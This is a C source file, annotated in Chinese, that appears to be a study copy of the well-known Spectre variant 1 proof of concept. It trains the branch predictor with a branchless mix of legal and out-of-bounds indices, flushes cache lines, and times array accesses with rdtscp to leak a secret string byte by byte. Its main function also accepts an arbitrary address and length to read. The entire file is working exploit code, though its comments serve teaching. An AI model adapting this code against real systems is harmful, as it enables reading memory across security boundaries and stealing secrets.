#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h> /* 需要支持 rdtsc, rdtscp, clflush, mfence*/

/********************************************************************
受害者代码
********************************************************************/

unsigned int array1_size = 16;
uint8_t unused1[64]; //避免在同一个缓存行，缓存行大小一般是64字节
uint8_t array1[16] = {
  1, 2, 3, 4, 5, 6, 7, 8,
  9, 10, 11, 12, 13, 14, 15, 16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0; /* 赋值，防止受害者函数被编译器优化 */


/* 受害者函数 */
void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

/* 读取缓存一个字节
* 实现通过缓存时序侧信道推测出 secret 字符串中的一个字节
* 
* 1. 初始化结果数组（results[256]）；
* 2. 重复尝试多轮，提升攻击稳定性；
*    2.1 驱逐 array2 出缓存；
*    2.2 对分支预测器进行“训练”；
*        - 多次让 victim_function 接受合法 index（training_x）
*        - 偶尔插入恶意 index（malicious_x），误导分支预测器；
*    2.3 根据投机执行时访问的 array2[secret*512] 导致的缓存命中情况，
*        测量 array2 每个槽访问延迟，猜测谁命中缓存；
*    2.4 统计命中次数最多的两个值，作为候选 secret；
*    2.5 如果第一名明显胜出，就提前退出循环；
* 3. 返回前两个命中得分最高的字节值及其分数。
*/
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256]; // 一字节有256种排列组合
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    // 初始化
    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = 999; tries > 0; tries--) {
        /* 把array2赶出缓存 */
        for (i = 0; i < 256; i++){
            _mm_clflush(&array2[i * 512]);
        }

        /* 训练分支预测器 */
        training_x = tries % array1_size; //正常访问
        for (j = 29; j >= 0; j--) {
            /* 将array1_size赶出缓存 防止推测时其在缓存 */
            _mm_clflush(&array1_size);

            // 时间延迟（免优化）
            for (volatile int z = 0; z < 100; z++) {}
            
            /* 无分支写法
            * 以1/6的概率输入恶意下标，5/6的概率输入正常下标 
            */
            x = ((j % 6) - 1) & ~0xFFFF; // 0-> 0xFFFF0000;1~5->0x00000000
            x = (x | (x >> 16)); // 0xFFFFFFFF;0x00000000 掩码
            x = training_x ^ (x & (malicious_x ^ training_x)); // mask=0 -> x=training_x;否则 x= malicious
            
            victim_function(x);
        }

        for (i = 0; i < 256; i++) {
            // 伪随机顺序访问，防止被预测
            mix_i = ((i * 167) + 13) & 255; //因为 167 与 256 互质，构成模 256 下的乘法置换，加 13 只是平移。能确保全排列
            addr = &array2[mix_i * 512];

            time1 = __rdtscp(&junk);
            junk = *addr; // 侧信道发生在这
            time2 = __rdtscp(&junk) - time1;

            // 避免误报：array1[training_x] 对应的 array2[array1[training_x] * 512] 会被真实访问
            if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
                results[mix_i]++;
        }

        /* 找出得分最高的、第二高的字节 */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } 
            else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        // 早停，可以加快破解密码速度
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
        break;
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
    // 防止junk = *addr; 被优化 results[0] 只是一个统计用数组的起始位置
    results[0] ^= junk;
}

int main(int argc, const char **argv) {
    int cache_hit_threshold = 80;
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int len = 40; //秘密字符串 长度为40
    int score[2];
    uint8_t value[2];
    int i;

    // 方便任意读取某段地址的任意长度
    if (argc >= 4) {
        sscanf(argv[2], "%p", (void **)&malicious_x);
        malicious_x -= (size_t)array1;
        sscanf(argv[3], "%d", &len);
    }

    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear")); //这也有个阈值
        printf("0x%02X='%c' count=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]); //ASCII可显示字符编号范围是32-126（0x20-0x7E），共95个字符。
        if (score[1] > 0) {
            printf("\t(second best: 0x%02X='%c' count=%d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
        }
        printf("\n");
    }
    return 0;
}
